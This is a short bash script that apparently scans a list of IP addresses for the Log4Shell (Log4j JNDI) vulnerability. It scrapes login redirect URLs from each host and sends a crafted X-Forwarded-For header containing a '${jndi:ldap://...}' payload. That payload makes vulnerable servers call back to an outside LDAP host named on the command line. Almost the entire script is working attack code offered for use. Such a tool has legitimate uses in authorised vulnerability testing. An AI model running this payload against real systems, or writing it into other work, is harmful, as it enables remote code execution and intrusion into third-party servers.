#!/bin/bash

while getopts l:b: flag
do
	case "${flag}" in
		l) list=${OPTARG};;
		b) burp=${OPTARG};;
	esac
done


while read ip; do
	curl -ski https://$ip/ui/login | grep location | cut -d " " -f 2 | cut -d "=" -f 1 | sed 's/$/=/' >> targets.txt
done < $list


while read host; do
	curl --insecure -vv -H "X-Forwarded-For: \${jndi:ldap://${burp}:1389}" $host
done < targets.txt


while true; do
	printf "\nWould you like to delete targets.txt? "
	read yn
	case $yn in
		[Yy]* ) rm -rf targets.txt;
			break;;
		[Nn]* ) exit;;
		* ) printf "\nJust gonna leave me hanging? You're a disappointment.\n";;
	esac
done
